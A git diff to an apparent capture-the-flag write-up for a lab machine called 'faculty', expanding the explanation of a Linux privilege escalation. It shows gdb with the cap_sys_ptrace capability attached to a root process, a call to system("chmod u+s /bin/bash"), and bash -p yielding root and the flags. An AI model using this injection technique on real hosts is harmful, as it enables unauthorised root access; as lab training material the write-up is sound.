@@ -1,3 +1,5 @@
+![image](https://user-images.githubusercontent.com/105310322/193358126-9389cc5c-ee9e-474a-8d2e-8b441cc677e4.png)
+
 
 ### Tools: feroxbuster, gdb
 
@@ -340,10 +342,15 @@ This group also has access to GDB!
 developer@faculty:/tmp$ id
 uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
 ```
-
-Linpeas revealed that gdb has cap_sys_ptrace capability.
+```
+developer@faculty:/tmp$ find / -group debug 2>/dev/null
+/usr/bin/gdb
+```
+Ive messed with debugging alot so I was interested if we could attach to a process and PE that way and linpeas revealed that gdb has cap_sys_ptrace capability.
 
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace
+
+GDB has the cap_sys_ptrace capability which I could not find to much info on this specifically.
 
 ```console
 ╔══════════╣ Capabilities
@@ -368,6 +375,8 @@ Files with capabilities (limited to 50):
 /usr/bin/mtr-packet = cap_net_raw+ep
 ```
 
+So to exploit this lets find a running process by root. Of the ones that populated we could use VGAuthService,vmtoolsd, and dbus-daemon.
+
 ```console
 developer@faculty:/tmp$ ps faux | grep /usr/bin
 root         650  0.0  0.5  46324 10724 ?        Ss   21:22   0:00 /usr/bin/VGAuthService
@@ -376,6 +385,9 @@ message+     689  0.0  0.2   7576  4708 ?        Ss   21:22   0:00 /usr/bin/dbus
 develop+   35172  0.0  0.0   5192   724 pts/0    S+   21:58   0:00  |           \_ grep --color=auto /usr/bin
 develop+    8932  0.0  0.1  79980  3348 ?        SLs  21:25   0:00  \_ /usr/bin/gpg-agent --supervised
 ```
+Run GDB and attach to the process. Next we are going to call the function system and chmod bash with a suid bit.
+
+```call (void)system("chmod u+s /bin/bash")```
 
 ```console
 (gdb) attach 689
@@ -399,13 +411,19 @@ When the function is done executing, GDB will silently stop.
 (gdb) 
 
 ```
+After running the command it may seem like it broke but if we run bash -p we can execute as root and cat both of the flags!
+
+
 ```console
 developer@faculty:/tmp$ bash -p
 bash-5.0# id
 uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
 bash-5.0# cat /home/developer/user.txt
-a22c5515a2ea18c17fb5b1f8813862d5
+a22c5***************************
+*****
 bash-5.0# cat /root/root.txt
-bcfcab15acf5a06f8dc1ee7c5a7769a0
+bcfca***************************
 bash-5.0# 
 ```
+
+GG!
